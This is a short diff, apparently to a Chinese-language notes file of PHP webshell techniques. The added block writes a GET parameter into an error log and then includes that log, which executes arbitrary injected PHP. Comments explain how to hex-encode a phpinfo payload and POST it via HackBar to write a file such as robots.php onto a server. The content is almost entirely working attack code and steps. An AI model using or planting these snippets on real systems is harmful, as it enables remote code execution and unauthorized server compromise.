@@ -154,6 +154,13 @@ if(@$_REQUEST["cc"]){
 }
 ?>
 
+<?php
+ini_set('log_errors', 'On'); 
+ini_set('error_log', 'test.log'); 
+
+error_log($_GET['a']);
+include 'test.log';
+?>
 
 #利用<?php phpinfo(); ?> urlencode %3C%3F%70%68%70%20%70%68%70%69%6E%66%6F%28%29%3B%20%3F%3E 去掉百分号3C3F70687020706870696E666F28293B203F3E
 #在index.php上使用hackbar 使用post，z1=/robots.php&z2=3C3F70687020706870696E666F28293B203F3E
